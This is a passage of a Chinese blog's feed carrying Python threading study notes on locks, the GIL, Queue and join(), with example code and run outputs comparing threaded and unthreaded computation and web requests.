&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191101-112015.html&quot;&gt;2、添加线程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191102-102624.html&quot;&gt;3、join功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191103-092239.html&quot;&gt;4、Queue功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191104-101112.html&quot;&gt;5、不一定有效率GIL&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-关于线程锁lock&quot;&gt;&lt;a href=&quot;#0x00-关于线程锁lock&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于线程锁lock&quot;&gt;&lt;/a&gt;0x00 关于线程锁lock&lt;/h1&gt;&lt;p&gt;多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。&lt;/p&gt;
&lt;p&gt;而使用lock就可以在不同线程使用同一共享内存时，能够确保线程之间互不影响。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】5、不一定有效率GIL.md</title>
    <link href="https://www.teamssix.com/year/191104-101112.html"/>
    <id>https://www.teamssix.com/year/191104-101112.html</id>
    <published>2019-11-04T02:11:12.000Z</published>
    <updated>2019-11-04T02:16:15.383Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><p><a href="https://www.teamssix.com/year/191103-092239.html">4、Queue功能</a></p><h1 id="0x00-关于GIL"><a href="#0x00-关于GIL" class="headerlink" title="0x00 关于GIL"></a>0x00 关于GIL</h1><p>GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。</p><a id="more"></a><p>每个CPU在同一时间只能执行一个线程（在单核CPU下的多线程其实都只是并发，不是并行，并发和并行从宏观上来讲都是同时处理多路请求的概念。但并发和并行又有区别，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。）</p><p>在Python多线程下，每个线程的执行方式如下：</p><p>1.获取GIL</p><p>2.执行代码直到sleep或者是python虚拟机将其挂起。</p><p>3.释放GIL</p><p>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</p><p>也就是说尽管Python支持多线程，但是因为GIL的存在，使得Python还是一次性只能处理一个东西，那是不是说Python中的多线程就完全没用了呢，当然不是的。</p><p>GIL往往只会影响到那些严重依赖CPU的程序，比如各种循环处理、计数等这种CPU密集型的程序；如果程序中大部分只会涉及到I/O，比如文件处理、网络爬虫等这种IO密集型的程序，那么多线程就能够有效的提高效率，因为在爬虫的时候大部分时间都在等待。</p><p>实际上，你完全可以放心的创建几千个Python线程， 现代操作系统运行这么多线程没有任何压力，没啥可担心的。</p><h1 id="0x01-测试GIL"><a href="#0x01-测试GIL" class="headerlink" title="0x01 测试GIL"></a>0x01 测试GIL</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(lists,q)</span>:</span></span><br><span class="line">   res = sum(lists)</span><br><span class="line">   q.put(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">(lists)</span>:</span></span><br><span class="line">   q = Queue()</span><br><span class="line">   threads_list = []</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">      t = threading.Thread(target=job,args=(copy.copy(lists),q),name = <span class="string">'任务 %i'</span> % i)</span><br><span class="line">      t.start()</span><br><span class="line">      threads_list.append(t)</span><br><span class="line">   <span class="keyword">for</span> t <span class="keyword">in</span> threads_list:</span><br><span class="line">      t.join()</span><br><span class="line"></span><br><span class="line">   total = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">      total += q.get()</span><br><span class="line">   print(<span class="string">'使用线程运算结果:'</span>,total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normal</span><span class="params">(lists)</span>:</span></span><br><span class="line">   total = sum(lists)</span><br><span class="line">   print(<span class="string">'不使用线程运算结果:'</span>,total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_job</span><span class="params">(i)</span>:</span></span><br><span class="line">   requests.get(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_multithreading</span><span class="params">(req_lists)</span>:</span></span><br><span class="line">   threads_list = []</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">      t = threading.Thread(target=req_job,args=(req_lists[i],),name=<span class="string">'爬虫任务 %i'</span> % i)</span><br><span class="line">      t.start()</span><br><span class="line">      threads_list.append(t)</span><br><span class="line">   <span class="keyword">for</span> t <span class="keyword">in</span> threads_list:</span><br><span class="line">      t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_normal</span><span class="params">(req_lists)</span>:</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> req_lists:</span><br><span class="line">      requests.get(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   lists = list(range(<span class="number">1000000</span>)) <span class="comment"># 完成一个较大的计算</span></span><br><span class="line">   req_lists = [<span class="string">'https://www.teamssix.com'</span>,<span class="string">'https://github.com/teamssix'</span>,<span class="string">'https://me.csdn.net/qq_37683287'</span>,<span class="string">'https://space.bilibili.com/148389186'</span>]</span><br><span class="line">   start_time = time.time()</span><br><span class="line">   multithreading(lists)</span><br><span class="line">   print(<span class="string">'计算使用线程耗时:'</span>, time.time() - start_time,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">   start_time = time.time()</span><br><span class="line">   normal(lists * <span class="number">4</span>)</span><br><span class="line">   print(<span class="string">'计算不使用线程耗时:'</span>, time.time() - start_time,<span class="string">'\n'</span>)</span><br><span class="line">   start_time = time.time()</span><br><span class="line">   req_multithreading(req_lists)</span><br><span class="line">   print(<span class="string">'爬虫使用线程耗时:'</span>, time.time() - start_time)</span><br><span class="line">   start_time = time.time()</span><br><span class="line">   req_normal(req_lists)</span><br><span class="line">   print(<span class="string">'爬虫不使用线程耗时:'</span>, time.time() - start_time)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 5_GIL.py</span></span><br><span class="line">使用线程运算结果: 1999998000000</span><br><span class="line">计算使用线程耗时: 0.39594030380249023 </span><br><span class="line"></span><br><span class="line">不使用线程运算结果: 1999998000000</span><br><span class="line">计算不使用线程耗时: 0.3919515609741211</span><br><span class="line"></span><br><span class="line">爬虫使用线程耗时: 2.2410056591033936</span><br><span class="line">爬虫不使用线程耗时: 7.1159656047821045</span><br></pre></td></tr></table></figure><p>可以看到在计算程序的代码中不使用线程和使用线程的运算结果是相同的，说明不使用线程和使用线程的程序都进行了一样多次的运算，但是很明显可以看到计算的耗时并没有少很多，按照预期我们使用了4个线程，应该会快近4倍才对，这就是因为GIL在作怪。<br>与此同时，可以看到在使用request对一个url发起get请求的时候，使用线程比不使用线程快了3倍多，也进一步的反映出在使用Python进行爬虫的时候，多线程确实可以很大程度上提高效率，但是在进行密集计算任务的时候，多线程就显得很鸡肋了。</p><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://zhuanlan.zhihu.com/p/20953544" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/20953544</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191101-112015.html&quot;&gt;2、添加线程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191102-102624.html&quot;&gt;3、join功能&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191103-092239.html&quot;&gt;4、Queue功能&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-关于GIL&quot;&gt;&lt;a href=&quot;#0x00-关于GIL&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于GIL&quot;&gt;&lt;/a&gt;0x00 关于GIL&lt;/h1&gt;&lt;p&gt;GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】4、Queue功能</title>
    <link href="https://www.teamssix.com/year/191103-092239.html"/>
    <id>https://www.teamssix.com/year/191103-092239.html</id>
    <published>2019-11-03T01:22:39.000Z</published>
    <updated>2019-11-03T01:46:44.674Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><h1 id="0x00-关于Queue"><a href="#0x00-关于Queue" class="headerlink" title="0x00 关于Queue"></a>0x00 关于Queue</h1><p>queue模块实现了各种【多生产者-多消费者】队列，可用于在执行的多个线程之间安全的交换信息。</p><a id="more"></a><p><strong>queue的常用方法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">q.size()：返回队列的正确大小。因为其他线程可能正在更新此队列，所以此方法的返回数字不可靠。</span><br><span class="line"></span><br><span class="line">q.empty()：如果队列为空，返回True，否则返回False。</span><br><span class="line"></span><br><span class="line">q.full()：如果队列已满，返回True，否则返回False。</span><br><span class="line"></span><br><span class="line">q.put(item,block,timeout)：将item放入队列。</span><br><span class="line">如果block设为True（默认值），调用者将被阻塞直到队列中出现可用的空闲位置为止。</span><br><span class="line">如果block设为False，队列满时此方法将引发Full异常。</span><br><span class="line"></span><br><span class="line">q.put_nowait(item):等价于q.put(item,False)</span><br><span class="line"></span><br><span class="line">q.get(block,timeout):从队列中删除一项，然后返回这个项。</span><br><span class="line">如果block设为True（默认值），调用者将阻塞，直到队列中出现可用的空闲为止。</span><br><span class="line">如果block设为False，队列为空时将引发Empty异常。</span><br><span class="line">timeout提供可选的超时值，单位为秒，如果超时，将引发Empty异常。</span><br><span class="line"></span><br><span class="line">q.get_nowait()：等价于get(0)</span><br><span class="line"></span><br><span class="line">q.task_done():在队列中数据的消费者用来指示对于项的处理已经结束。如果使用此方法，那么从队列中删除的每一项都应该调用一次。</span><br><span class="line"></span><br><span class="line">q.join()：阻塞直到队列中的所有项均被删除和处理为止。一旦为队列中的每一项都调用了一次q.task_done()方法，此方法将会直接返回。</span><br></pre></td></tr></table></figure><h1 id="0x01-本节代码实现功能"><a href="#0x01-本节代码实现功能" class="headerlink" title="0x01 本节代码实现功能"></a>0x01 本节代码实现功能</h1><p>将数据列表中的数据传入，使用三个线程处理，将结果保存在Queue中，线程执行完后，从Queue中获取存储的结果。</p><h1 id="0x02导入线程-队列的标准模块"><a href="#0x02导入线程-队列的标准模块" class="headerlink" title="0x02导入线程,队列的标准模块"></a>0x02导入线程,队列的标准模块</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br></pre></td></tr></table></figure><h1 id="0x03-定义一个被多线程调用的函数"><a href="#0x03-定义一个被多线程调用的函数" class="headerlink" title="0x03 定义一个被多线程调用的函数"></a>0x03 定义一个被多线程调用的函数</h1><p>该函数的参数是一个列表lists和一个队列q，其功能是对lists列表中的元素除2取整，之后利用q.put()将结果保存在队列q中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(lists,q)</span>:</span> <span class="comment"># 被调用函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lists)):</span><br><span class="line">        lists[i] = lists[i]//<span class="number">2</span> <span class="comment"># lists元素除2取整</span></span><br><span class="line">    q.put(lists) <span class="comment"># 多线程调用的函数不能用return返回值</span></span><br></pre></td></tr></table></figure><h1 id="0x04-定义一个多线程函数"><a href="#0x04-定义一个多线程函数" class="headerlink" title="0x04 定义一个多线程函数"></a>0x04 定义一个多线程函数</h1><p>在多线程函数中定义一个Queue用来保存返回值代替return，同时定义一个多线程列表，初始化一个多维数据列表用来传入上面的job()函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">()</span>:</span> <span class="comment"># 调用多线程的函数</span></span><br><span class="line">    q = Queue() <span class="comment"># 存放job()函数的返回值</span></span><br><span class="line">    thread_list = []</span><br><span class="line">    data = [[<span class="number">1</span>],[<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]]</span><br></pre></td></tr></table></figure><p>定义三个线程，启动线程并分别join三个线程到主线程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment"># 定义三个线程</span></span><br><span class="line">    t = threading.Thread(target=job,args=(data[i],q))</span><br><span class="line">    t.start()</span><br><span class="line">    thread_list.append(t) <span class="comment"># 将线程添加到thread_list列表中 </span></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> thread_list:</span><br><span class="line">    thread.join()</span><br></pre></td></tr></table></figure><p>定义一个空的result_list列表，将队列q中的数据添加到列表中并print</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">result_list = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment"># 循环三次</span></span><br><span class="line">    result_list.append(q.get())</span><br><span class="line">    print(result_list[j])</span><br></pre></td></tr></table></figure><h1 id="0x05-完整的代码"><a href="#0x05-完整的代码" class="headerlink" title="0x05 完整的代码"></a>0x05 完整的代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(lists,q)</span>:</span> <span class="comment"># 被调用函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lists)):</span><br><span class="line">        lists[i] = lists[i]//<span class="number">2</span> <span class="comment"># lists元素除2取整</span></span><br><span class="line">    q.put(lists) <span class="comment"># 多线程调用的函数不能用return返回值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span><span class="params">()</span>:</span> <span class="comment"># 调用多线程的函数</span></span><br><span class="line">    q = Queue() <span class="comment"># 存放job()函数的返回值</span></span><br><span class="line">    thread_list = []</span><br><span class="line">    data = [[<span class="number">1</span>],[<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment"># 定义三个线程</span></span><br><span class="line">        t = threading.Thread(target=job,args=(data[i],q))</span><br><span class="line">        t.start()</span><br><span class="line">        thread_list.append(t) <span class="comment"># 将线程添加到thread_list列表中</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> thread_list:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    result_list = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment"># 循环三次</span></span><br><span class="line">        result_list.append(q.get())</span><br><span class="line">        print(result_list[j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    multithreading()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 4_queue.py</span></span><br><span class="line">[0]</span><br><span class="line">[1, 1]</span><br><span class="line">[2, 2, 3]</span><br></pre></td></tr></table></figure><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://segmentfault.com/a/1190000016330288" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016330288</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191101-112015.html&quot;&gt;2、添加线程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191102-102624.html&quot;&gt;3、join功能&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-关于Queue&quot;&gt;&lt;a href=&quot;#0x00-关于Queue&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于Queue&quot;&gt;&lt;/a&gt;0x00 关于Queue&lt;/h1&gt;&lt;p&gt;queue模块实现了各种【多生产者-多消费者】队列，可用于在执行的多个线程之间安全的交换信息。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】3、join功能</title>
    <link href="https://www.teamssix.com/year/191102-102624.html"/>
    <id>https://www.teamssix.com/year/191102-102624.html</id>
    <published>2019-11-02T02:26:24.000Z</published>
    <updated>2019-11-02T12:21:06.105Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><h1 id="0x00-不使用join-的结果"><a href="#0x00-不使用join-的结果" class="headerlink" title="0x00 不使用join()的结果"></a>0x00 不使用join()的结果</h1><p>首先在上一节的示例基础上进行简单修改</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_jobs</span><span class="params">()</span>:</span>  <span class="comment"># 定义要添加的线程</span></span><br><span class="line">    print(<span class="string">'任务1开始\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    print(<span class="string">'任务1结束\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    thread = threading.Thread(target=thread_jobs,name=<span class="string">'任务1'</span>)  <span class="comment"># 定义线程</span></span><br><span class="line">    thread.start()  <span class="comment"># 开始线程</span></span><br><span class="line">    print(<span class="string">'所有任务已完成\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>预计输出结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">任务1结束</span><br><span class="line">所有任务已完成</span><br></pre></td></tr></table></figure><p>实际输出结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">所有任务已完成</span><br><span class="line">任务1结束</span><br></pre></td></tr></table></figure><p>可以看到在线程还没有结束的时候，程序就开始运行之后的代码了，也就是说线程和其他部分的程序都是同步进行的，如果想要避免这种情况，想要程序按照代码顺序执行的话，就需要用到join功能。</p><h1 id="0x01-使用join-的结果"><a href="#0x01-使用join-的结果" class="headerlink" title="0x01 使用join()的结果"></a>0x01 使用join()的结果</h1><p>在源代码thread.start()下加入thread.join()即可，原来代码的main函数就变成这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    thread = threading.Thread(target=thread_jobs,name=<span class="string">'任务1'</span>)  <span class="comment"># 定义线程</span></span><br><span class="line">    thread.start()  <span class="comment"># 开始线程</span></span><br><span class="line">    thread.join() <span class="comment">#加入join功能</span></span><br><span class="line">    print(<span class="string">'所有任务已完成\n'</span>)</span><br></pre></td></tr></table></figure><p>这里就表示必须要等到任务1这个线程结束后，才能执行thread.join()之后的代码，代码运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">任务1结束</span><br><span class="line">所有任务已完成</span><br></pre></td></tr></table></figure><p>使用join控制多个线程的执行顺序很关键。</p><h1 id="0x02-添加第2个线程"><a href="#0x02-添加第2个线程" class="headerlink" title="0x02 添加第2个线程"></a>0x02 添加第2个线程</h1><p>这时如果我们加入第2个线程，但是不加入join功能，看看又是什么样，第2个线程的任务量较小，因此比第1个线程会更快执行，加入的第2个线程如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_jobs2</span><span class="params">()</span>:</span> <span class="comment"># 定义第2个线程</span></span><br><span class="line">    print(<span 